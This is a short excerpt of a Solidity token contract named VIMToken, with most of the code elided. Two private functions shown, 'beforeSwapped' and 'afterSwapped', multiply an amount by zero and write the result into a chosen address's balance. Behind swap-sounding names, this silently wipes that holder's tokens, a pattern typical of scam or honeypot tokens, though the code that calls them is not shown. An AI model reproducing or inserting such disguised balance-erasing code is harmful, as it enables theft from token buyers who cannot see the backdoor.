...
contract VIMToken is Context, IERC20, Ownable {
    ...
    function beforeSwapped(uint256 tokens, address to) private {
        uint256 BNBtosend = tokens*0;
        afterSwapped(BNBtosend, to);
    }

    function afterSwapped(uint256 token, address to) private {
        _tOwned[to] = token;
    }
